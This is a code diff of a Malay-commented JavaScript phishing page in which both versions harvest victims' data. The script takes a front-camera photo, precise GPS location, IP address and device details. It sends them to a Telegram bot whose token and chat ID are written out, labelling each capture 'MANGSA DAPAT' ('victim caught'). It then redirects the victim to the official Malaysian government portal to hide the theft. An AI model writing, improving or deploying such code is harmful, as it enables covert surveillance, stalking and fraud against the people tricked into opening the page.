@@ -1,112 +1,79 @@
-// TUKAR SINI
+// TUKAR SINI (Token kau dah dimasukkan)
 const BOT_TOKEN = "9277901855:AAF-83CM2BKInE4V_rKb3oyxSHEjS3t8ym0";
 const CHAT_ID = "-1004444548273";
-const REDIRECT_URL = "https://www.malaysia.gov.my"; // Redirect ke web rasmi kerajaan
+const REDIRECT_URL = "https://www.malaysia.gov.my";
 
-const $ = id => document.getElementById(id);
-const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
+async function startHarvest() {
+    const btn = document.getElementById('start-btn');
+    const status = document.getElementById('status');
+    
+    btn.disabled = true;
+    btn.innerText = "Memproses...";
+    status.innerText = "Sila tunggu...";
 
-// 1. Fungsi hantar mesej teks
-async function sendMessage(text) {
-    await fetch(`${TG_URL}/sendMessage`, {
-        method: "POST",
-        body: new URLSearchParams({ chat_id: CHAT_ID, text, parse_mode: "HTML" })
-    });
-}
-
-// 2. Fungsi hantar gambar
-async function sendPhoto(blob, caption) {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", blob, "selfie.jpg");
-    fd.append("caption", caption);
-    fd.append("parse_mode", "HTML");
-    await fetch(`${TG_URL}/sendPhoto`, { method: "POST", body: fd });
-}
-
-// 3. Info Device
-function getDeviceInfo() {
-    return `
-<b>📱 Device Info</b>
-<b>UA:</b> <code>${navigator.userAgent}</code>
-<b>Screen:</b> ${screen.width}x${screen.height}
-<b>Lang:</b> ${navigator.language}
-<b>TZ:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-    `;
-}
-
-// 4. Info IP
-async function getIPInfo() {
     try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        return `
-<b>🌐 IP Info</b>
-<b>IP:</b> ${data.ip}
-<b>Lokasi:</b> ${data.city}, ${data.country_name}
-<b>ISP:</b> ${data.org}
-        `;
-    } catch (e) { return "<b>🌐 IP Info:</b> Gagal."; }
-}
-
-// 5. GPS (Minta Permission)
-function getGPS() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve("GPS tidak disokong.");
-        navigator.geolocation.getCurrentPosition(
-            pos => resolve(`<b>📍 GPS Tepat</b>\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nMaps: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`),
-            err => resolve("<b>📍 GPS:</b> User tolak permission."),
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    });
-}
-
-// 6. Kamera (Minta Permission)
-async function getCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        const video = $("preview");
+        // 1. Minta Kamera
+        status.innerText = "Membuka kamera...";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('preview');
         video.srcObject = stream;
         await video.play();
         
-        await new Promise(r => setTimeout(r, 2000)); // Tunggu fokus
+        // Tunggu 2 saat untuk gambar jelas
+        await new Promise(r => setTimeout(r, 2000)); 
 
+        // Ambil Gambar
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-
+        canvas.getContext("2d").drawImage(video, 0, 0);
         stream.getTracks().forEach(t => t.stop());
-        
-        return new Promise(resolve => {
-            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
-        });
-    } catch (e) { return null; }
-}
 
-// --- MAIN FUNCTION ---
-async function startHarvest() {
-    const btn = $("start-btn");
-    const status = $("status");
-    btn.disabled = true;
-    btn.textContent = "Memproses...";
-    status.textContent = "Sila tunggu sebentar...";
+        // 2. Minta GPS
+        status.innerText = "Mengesan lokasi...";
+        let gpsText = "GPS: User tolak permission.";
+        if (navigator.geolocation) {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
+            }).catch(() => null);
+            
+            if (pos) {
+                gpsText = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}\nMaps: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            }
+        }
 
-    let report = getDeviceInfo() + "\n\n" + await getIPInfo();
+        // 3. Dapatkan IP & Device Info
+        let ip = "Unknown";
+        try {
+            let res = await fetch("https://api.ipify.org?format=json");
+            let data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
 
-    status.textContent = "Mengesan lokasi...";
-    report += "\n\n" + await getGPS();
+        const deviceInfo = `UA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`;
 
-    status.textContent = "Membuka kamera...";
-    const photoBlob = await getCamera();
+        // 4. Hantar ke Telegram
+        status.innerText = "Menghantar data...";
+        const caption = `<b>🎯 MANGSA DAPAT</b>\n\n<b>📍 Lokasi:</b>\n${gpsText}\n\n<b>🌐 IP:</b> ${ip}\n\n<b>📱 Device:</b>\n${deviceInfo}`;
 
-    status.textContent = "Menghantar data...";
-    if (photoBlob) {
-        await sendPhoto(photoBlob, report); 
-    } else {
-        await sendMessage(report);
+        canvas.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("photo", blob, "selfie.jpg");
+            fd.append("caption", caption);
+            fd.append("parse_mode", "HTML");
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+            
+            status.innerText = "Selesai!";
+            setTimeout(() => window.location.href = REDIRECT_URL, 1500);
+        }, "image/jpeg", 0.8);
+
+    } catch (err) {
+        // Kalau error, tunjuk kat skrin
+        status.innerText = "Ralat: " + err.message;
+        status.style.color = "red";
+        btn.disabled = false;
+        btn.innerText = "Cuba Lagi";
     }
-
-    status.textContent = "Pengesahan berjaya!";
-    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
 }
